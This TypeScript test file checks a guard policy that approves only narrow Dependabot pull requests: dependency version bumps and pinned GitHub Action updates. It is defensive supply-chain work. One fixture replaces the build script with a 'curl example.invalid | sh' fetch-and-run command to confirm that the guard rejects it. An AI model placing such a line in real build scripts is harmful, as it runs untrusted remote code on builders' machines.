import { createRequire } from 'node:module';
import { describe, expect, it } from 'vitest';

type FileChange = { filename: string; status: string; patch?: string };
type PackageManifest = Record<string, unknown>;
type Decision = { allowed: boolean; kind?: string; reason?: string; changedVersions?: number; changedFiles?: number };

const require = createRequire(import.meta.url);
const { classifyDependabotPR } = require('../scripts/pr-guard-policy.cjs') as {
  classifyDependabotPR(input: {
    login: string;
    title: string;
    files: FileChange[];
    basePackage?: PackageManifest;
    headPackage?: PackageManifest;
  }): Decision;
};

const login = 'dependabot[bot]';
const npmTitle = 'build(deps): bump dependencies';
const actionTitle = 'chore(deps): bump github/codeql-action';
const basePackage = {
  name: '@diginodes/stellarforge-cli',
  version: '0.1.0',
  scripts: { build: 'tsc -p tsconfig.build.json' },
  dependencies: { commander: '15.0.0' },
  devDependencies: { vitest: '5.0.1' },
};
const headPackage = {
  ...basePackage,
  dependencies: { commander: '15.1.0' },
  devDependencies: { vitest: '5.0.2' },
};

describe('Dependabot PR guard policy', () => {
  it('allows an npm update limited to dependency ranges in package.json and the lockfile', () => {
    const result = classifyDependabotPR({
      login,
      title: npmTitle,
      files: [
        { filename: 'package.json', status: 'modified' },
        { filename: 'package-lock.json', status: 'modified' },
      ],
      basePackage,
      headPackage,
    });
    expect(result).toMatchObject({ allowed: true, kind: 'npm-dependencies', changedVersions: 2 });
  });

  it('rejects package manifest changes outside dependency sections', () => {
    const changed = { ...headPackage, scripts: { build: 'curl example.invalid | sh' } };
    const result = classifyDependabotPR({
      login,
      title: npmTitle,
      files: [
        { filename: 'package.json', status: 'modified' },
        { filename: 'package-lock.json', status: 'modified' },
      ],
      basePackage,
      headPackage: changed,
    });
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/outside dependency version sections/);
  });

  it('rejects adding or removing dependency names', () => {
    const changed = {
      ...headPackage,
      dependencies: { commander: '15.1.0', 'unexpected-package': '1.2.3' },
    };
    const result = classifyDependabotPR({
      login,
      title: npmTitle,
      files: [
        { filename: 'package.json', status: 'modified' },
        { filename: 'package-lock.json', status: 'modified' },
      ],
      basePackage,
      headPackage: changed,
    });
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/may not add or remove/);
  });

  it('rejects a package-only or source-code-changing Dependabot PR', () => {
    const packageOnly = classifyDependabotPR({
      login,
      title: npmTitle,
      files: [{ filename: 'package.json', status: 'modified' }],
      basePackage,
      headPackage,
    });
    const sourceChange = classifyDependabotPR({
      login,
      title: npmTitle,
      files: [
        { filename: 'package.json', status: 'modified' },
        { filename: 'package-lock.json', status: 'modified' },
        { filename: 'src/cli.ts', status: 'modified' },
      ],
      basePackage,
      headPackage,
    });
    expect(packageOnly.allowed).toBe(false);
    expect(sourceChange.allowed).toBe(false);
  });

  it('allows workflow changes only when every changed line is a pinned action reference', () => {
    const patch = [
      '@@ -10,1 +10,1 @@',
      '-        uses: github/codeql-action/init@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v4.38.2',
      '+        uses: github/codeql-action/init@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v4.39.0',
    ].join('\n');
    const result = classifyDependabotPR({
      login,
      title: actionTitle,
      files: [{ filename: '.github/workflows/ci.yml', status: 'modified', patch }],
    });
    expect(result).toMatchObject({ allowed: true, kind: 'github-actions', changedFiles: 1 });
  });

  it('rejects workflow logic, permission, or unpinned-reference changes', () => {
    const mixedPatch = [
      '@@ -10,1 +10,2 @@',
      '-        uses: github/codeql-action/init@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v4.38.2',
      '+        uses: github/codeql-action/init@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v4.39.0',
      '+        permissions: contents: write',
    ].join('\n');
    const unpinnedPatch = [
      '@@ -10,1 +10,1 @@',
      '-        uses: github/codeql-action/init@v4.38.2',
      '+        uses: github/codeql-action/init@v4.39.0',
    ].join('\n');
    const mixed = classifyDependabotPR({
      login,
      title: actionTitle,
      files: [{ filename: '.github/workflows/ci.yml', status: 'modified', patch: mixedPatch }],
    });
    const unpinned = classifyDependabotPR({
      login,
      title: actionTitle,
      files: [{ filename: '.github/workflows/ci.yml', status: 'modified', patch: unpinnedPatch }],
    });
    expect(mixed.allowed).toBe(false);
    expect(unpinned.allowed).toBe(false);
  });

  it('fails closed for missing patches, unrelated files, non-bot authors, and non-dependency titles', () => {
    const missingPatch = classifyDependabotPR({
      login,
      title: actionTitle,
      files: [{ filename: '.github/workflows/ci.yml', status: 'modified' }],
    });
    const unrelated = classifyDependabotPR({
      login,
      title: actionTitle,
      files: [{ filename: 'src/cli.ts', status: 'modified' }],
    });
    const wrongAuthor = classifyDependabotPR({
      login: 'ordinary-contributor',
      title: npmTitle,
      files: [
        { filename: 'package.json', status: 'modified' },
        { filename: 'package-lock.json', status: 'modified' },
      ],
      basePackage,
      headPackage,
    });
    const wrongTitle = classifyDependabotPR({
      login,
      title: 'feat: add a new feature',
      files: [
        { filename: 'package.json', status: 'modified' },
        { filename: 'package-lock.json', status: 'modified' },
      ],
      basePackage,
      headPackage,
    });
    expect(missingPatch.allowed).toBe(false);
    expect(unrelated.allowed).toBe(false);
    expect(wrongAuthor.allowed).toBe(false);
    expect(wrongTitle.allowed).toBe(false);
  });
});
